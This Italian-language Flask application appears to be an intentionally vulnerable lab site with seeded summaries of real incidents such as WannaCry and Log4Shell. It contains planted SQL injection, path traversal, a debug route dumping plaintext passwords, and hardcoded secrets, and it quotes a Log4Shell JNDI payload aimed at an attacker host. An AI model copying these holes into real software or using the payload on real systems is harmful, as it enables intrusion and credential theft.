from flask import Flask, render_template, request, redirect, url_for, session, abort
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import text


app = Flask(__name__)
app.secret_key = 'SECRETKEY123'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)


class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)
    email = db.Column(db.String(120))
    credit_card = db.Column(db.String(50))
    role = db.Column(db.String(20), default='user')


class Comment(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), nullable=False)
    content = db.Column(db.Text, nullable=False)


class Report(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(200), nullable=False)
    cve_id = db.Column(db.String(50))
    date = db.Column(db.String(50))
    impact = db.Column(db.Text)
    description = db.Column(db.Text)
    technical_details = db.Column(db.Text)
    affected_systems = db.Column(db.Text)
    solution = db.Column(db.Text)
    source = db.Column(db.String(200))
    image_url = db.Column(db.String(200))


with app.app_context():
    db.create_all()

    if Report.query.count() == 0:
        reports = [
            Report(
                title="WannaCry Ransomware Attack",
                cve_id="CVE-2017-0144 (EternalBlue)",
                date="Maggio 2017",
                impact="300.000+ computer infetti in 150 paesi. Danni stimati tra 4 e 8 miliardi di dollari. Colpiti ospedali UK, Telefonica, FedEx, Renault.",
                description="WannaCry è un ransomware che ha sfruttato la vulnerabilità EternalBlue nei sistemi Windows. Ha crittografato i file e richiesto un riscatto in Bitcoin (300-600$).",
                technical_details="La vulnerabilità risiede nel protocollo SMBv1 (Server Message Block). L'attaccante invia un pacchetto craftato che causa un buffer overflow, permettendo l'esecuzione di codice remoto. Microsoft aveva rilasciato una patch a marzo 2017, ma molti sistemi (inclusi ospedali UK) non l'avevano installata. Un kill switch (dominio trovato per caso) ha fermato la propagazione.",
                affected_systems="Windows XP, Windows 7, Windows Server 2008 R2, Windows 8.1, Windows Server 2012. Non colpisce Windows 10.",
                solution="Applicare la patch MS17-010. Disabilitare SMBv1. Mantenere backup offline. Aggiornare sistemi legacy.",
                source="https://www.cisa.gov/known-exploited-vulnerabilities",
                image_url="https://upload.wikimedia.org/wikipedia/commons/thumb/0/03/WannaCry_screenshot.png/300px-WannaCry_screenshot.png"
            ),
            Report(
                title="Attacco all'Infrastruttura Vaccini Regione Lazio",
                cve_id="Attacco Ransomware (LockBit)",
                date="1 Agosto 2021",
                impact="Blocco del portale prenotazioni vaccini per 3 giorni. 2 ore di blackout completo. Dati sensibili di cittadini esposti. Richiesta riscatto: 5 milioni di euro.",
                description="Un attacco ransomware ha colpito il data center della Regione Lazio che gestiva le prenotazioni dei vaccini anti-COVID durante la campagna vaccinale di massa.",
                technical_details="L'attacco ha sfruttato vulnerabilità in sistemi VPN Pulse Secure (CVE-2019-11510, CVE-2020-8243) non aggiornati. I criminali hanno utilizzato un ransomware della famiglia LockBit, cifrando 49 server. L'attacco è iniziato alle 5:00 del mattino per massimizzare l'impatto. La Regione ha dichiarato di non aver pagato il riscatto, ripristinando da backup.",
                affected_systems="Server Windows, sistemi di prenotazione CED, VPN Pulse Secure, database sanitari.",
                solution="Aggiornamento di tutti i sistemi VPN (patch disponibili da mesi). Implementazione MFA obbligatoria. Segmentazione di rete. Backup offline quotidiani.",
                source="https://www.cybersecurity360.it/nuove-minacce/attacco-ransomware-regione-lazio/",
                image_url="https://www.regione.lazio.it/sites/default/files/styles/medium/public/news/2021-08/COMUNICATO%20LAZIOcrea_3.png"
            ),
            Report(
                title="Log4Shell (Apache Log4j RCE)",
                cve_id="CVE-2021-44228",
                date="9 Dicembre 2021",
                impact="CVSS 10.0 (massimo). Milioni di applicazioni Java vulnerabili. Colpiti: Apple, Amazon, Cloudflare, Minecraft, VMware, ElasticSearch, Apache Struts.",
                description="Vulnerabilità critica in Log4j 2 (libreria di logging più usata in Java). Un attaccante può eseguire codice remoto semplicemente facendo loggare una stringa malevola.",
                technical_details="Log4j esegue lookup JNDI (Java Naming and Directory Interface) sulle stringhe loggate. Inviando `${jndi:ldap://attacker.com/exploit}` si costringe il server a scaricare ed eseguire codice Java malevolo da un server LDAP controllato dall'attaccante. Sfruttabile via User-Agent, parametri HTTP, headers, campi form, JSON, XML. Esistono bypass (CVE-2021-45046, CVE-2021-45105, CVE-2021-44832).",
                affected_systems="Log4j 2.0-beta9 fino a 2.14.1. Tutti i sistemi Java che usano Log4j con JNDI lookup abilitato (default).",
                solution="Aggiornare a Log4j 2.15.0 (poi 2.16.0, 2.17.0, 2.17.1). Disabilitare JNDI lookup con `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` o rimuovere la classe JndiLookup dal classpath.",
                source="https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
                image_url="https://www.lunasec.io/docs/img/log4shell-logo.png"
            ),
            Report(
                title="Heartbleed (OpenSSL)",
                cve_id="CVE-2014-0160",
                date="7 Aprile 2014",
                impact="66% dei server web vulnerabili (circa 500.000). Esposte chiavi private (SSL/TLS), password, sessioni, dati sensibili di utenti.",
                description="Bug critico nell'implementazione del heartbeat TLS/DTLS di OpenSSL. Permette di leggere 64KB di memoria del server oltre il buffer consentito.",
                technical_details="La funzione `tls1_process_heartbeat` non verificava che la richiesta di heartbeat corrispondesse alla dimensione effettiva del payload. Un attaccante poteva inviare una richiesta con payload fittizio di 1 byte ma dichiarare una lunghezza di 65536, ricevendo indietro 64KB di memoria adiacente al buffer. Nessun log dell'attacco. Sfruttabile passivamente.",
                affected_systems="OpenSSL 1.0.1 fino a 1.0.1f. Non colpite versioni 1.0.0, 0.9.8, 1.1.0.",
                solution="Aggiornare OpenSSL a 1.0.1g. Revocare e rigenerare tutti i certificati SSL/TLS. Cambiare tutte le password degli utenti.",
                source="https://heartbleed.com/",
                image_url="https://heartbleed.com/heartbleed.png"
            ),
            Report(
                title="SolarWinds Supply Chain Attack",
                cve_id="CVE-2020-10148, SUNBURST backdoor",
                date="Dicembre 2020 (scoperto)",
                impact="18.000 clienti SolarWinds compromessi. Agenzie USA colpite: DHS, Treasury, Commerce, Energy, State Department. Attacco attribuito a APT29 (Cozy Bear - Russia).",
                description="Attacco alla supply chain: backdoor iniettata nell'update legittimo di SolarWinds Orion. Gli aggressori hanno firmato il malware con certificato digitale rubato di SolarWinds.",
                technical_details="Il malware SUNBURST rimaneva dormiente per 12-14 giorni dopo l'installazione, poi contattava C2. Permetteva esecuzione comandi, exfiltration dati, movimento laterale. L'attacco ha richiesto mesi di pianificazione. Gli aggressori hanno prima compromesso l'ambiente di build di SolarWinds.",
                affected_systems="SolarWinds Orion Platform versioni 2019.4 HF5, 2020.2.1 HF1, 2020.2.1, 2019.4, 2019.2, 2018.4, 2018.2, 2017.2.",
                solution="Aggiornare SolarWinds Orion a versione 2020.2.1 HF2. Isolare sistemi compromessi. Audit completo del traffico di rete. Implementare Zero Trust.",
                source="https://www.cisa.gov/solarwinds",
                image_url="https://www.cisa.gov/sites/default/files/styles/image_card_800x450/public/2022-03/solarwindsimage.jpg"
            ),
            Report(
                title="Attacco Ransomware ASL Napoli 1",
                cve_id="Attacco Ransomware (CryptoLocker)",
                date="Febbraio 2021",
                impact="Blocco di 4 ospedali della ASL Napoli 1 Centro. Operazioni di triage e pronto soccorso rallentate. Esami diagnostici bloccati.",
                description="Attacco ransomware ha colpito l'infrastruttura informatica della ASL Napoli 1, interrompendo i servizi sanitari durante la pandemia COVID.",
                technical_details="Accesso via RDP esposto su internet senza MFA. Utilizzo di credenziali deboli. Diffusione tramite GPO (Group Policy Objects). Cifratura di file server e postazioni di lavoro.",
                affected_systems="Server Windows, postazioni cliniche, sistemi di refertazione.",
                solution="Disabilitare RDP esposto. Implementare MFA. Backup 3-2-1 (3 copie, 2 supporti diversi, 1 offline). Segmentazione di rete tra reparti.",
                source="https://www.cybersecitalia.it/ransomware-asl-napoli/",
                image_url=""
            )
        ]
        for r in reports:
            db.session.add(r)
        db.session.commit()

    if User.query.count() == 0:
        users = [
            User(username="admin", password="admin123", email="admin@nestyk.it", credit_card="4111-1111-1111-1111",
                 role="admin"),
            User(username="mario_rossi", password="password123", email="mario@gmail.com",
                 credit_card="5500-0000-0000-0004", role="user"),
            User(username="luca_bianchi", password="luca123", email="luca@gmail.com",
                 credit_card="3400-0000-0000-0000", role="user")
        ]
        for u in users:
            db.session.add(u)
        db.session.commit()


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/acc')
def acc_index():
    return render_template('acc/dashboard.html')


@app.route('/acc/login')
def acc_login():
    return render_template('acc/login.html')


@app.route('/acc/dashboard')
def acc_dashboard():
    if 'user_id' not in session:
        return redirect(url_for('acc_login'))
    return render_template('acc/dashboard.html')


@app.route('/acc/profile/<int:user_id>')
def acc_profile(user_id):
    if 'user_id' not in session:
        return redirect(url_for('acc_login'))

    query = f"SELECT * FROM user WHERE id = {user_id}"
    user = db.session.execute(text(query)).first()
    if user:
        user_data = User.query.get(user[0])
        return render_template('acc/profile.html', user=user_data)
    return "Utente non trovato", 404


@app.route('/acc/comments', methods=['GET', 'POST'])
def acc_comments():
    if 'user_id' not in session:
        return redirect(url_for('acc_login'))

    if request.method == 'POST':
        content = request.form.get('content')
        username = session.get('username')
        comment = Comment(username=username, content=content)
        db.session.add(comment)
        db.session.commit()
        return redirect(url_for('acc_comments'))

    all_comments = Comment.query.order_by(Comment.id.desc()).all()
    return render_template('acc/comments.html', comments=all_comments)


@app.route('/acc/files')
def acc_files():
    if 'user_id' not in session:
        return redirect(url_for('acc_login'))

    filename = request.args.get('file', 'documenti.txt')
    filepath = f"data/{filename}"

    try:
        with open(filepath, 'r') as f:
            content = f.read()
        return render_template('acc/files.html', content=content, filename=filename)
    except:
        return render_template('acc/files.html', error="File non trovato", filename=filename)
@app.route('/login')
def login_page():
    return render_template('acc/login.html')


@app.route('/do_login', methods=['POST'])
def do_login():
    username = request.form.get('username')
    password = request.form.get('password')

    query = f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'"
    print(query)
    try:
        result = db.session.execute(text(query)).first()
        if result:
            user = User.query.get(result[0])
            session['user_id'] = user.id
            session['username'] = user.username
            session['role'] = user.role
            return redirect(url_for('dashboard'))
    except Exception as e:
        print(e)


    return render_template('acc/login.html', error="Credenziali errate")

#DEBUG
@app.route('/debug_check')
def debug_check():
    from sqlalchemy import inspect, text
    inspector = inspect(db.engine)
    tables = inspector.get_table_names()

    result = f"Tabelle nel database: {tables}<br><br>"

    if 'user' in tables:
        users = db.session.execute(text("SELECT * FROM user")).fetchall()
        result += f"Utenti trovati: {len(users)}<br>"
        for u in users:
            result += f"ID: {u[0]}, Username: {u[1]}, Password: {u[2]}<br>"
    else:
        result += "Tabella 'user' non trovata! Devi creare il database."

    return result
@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login_page'))
    return render_template('acc/dashboard.html')


@app.route('/profile/<int:user_id>')
def profile(user_id):
    if 'user_id' not in session:
        return redirect(url_for('login_page'))

    query = f"SELECT * FROM user WHERE id = {user_id}"
    user = db.session.execute(text(query)).first()
    if user:
        user_data = User.query.get(user[0])
        return render_template('acc/profile.html', user=user_data)
    return "Utente non trovato", 404

@app.route('/404', methods=['GET'])
def notfound_page():
    return render_template('acc/404.html')
@app.route('/comments', methods=['GET', 'POST'])
def comments():
    if 'user_id' not in session:
        return redirect(url_for('login_page'))

    if request.method == 'POST':
        content = request.form.get('content')
        username = session.get('username')
        comment = Comment(username=username, content=content)
        db.session.add(comment)
        db.session.commit()
        return redirect(url_for('comments'))

    all_comments = Comment.query.order_by(Comment.id.desc()).all()
    return render_template('acc/comments.html', comments=all_comments)


@app.route('/files')
def files():
    if 'user_id' not in session:
        return redirect(url_for('login_page'))

    filename = request.args.get('file', 'documenti.txt')
    filepath = f"data/{filename}"

    try:
        with open(filepath, 'r') as f:
            content = f.read()
        return render_template('acc/files.html', content=content, filename=filename)
    except:
        return render_template('acc/files.html', error="File non trovato", filename=filename)


@app.route('/reports')
def reports_index():
    all_reports = Report.query.order_by(Report.id).all()
    return render_template('reports/index.html', reports=all_reports)


@app.route('/reports/<int:report_id>')
def report_detail(report_id):
    report = Report.query.get_or_404(report_id)
    return render_template('reports/detail.html', report=report)


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)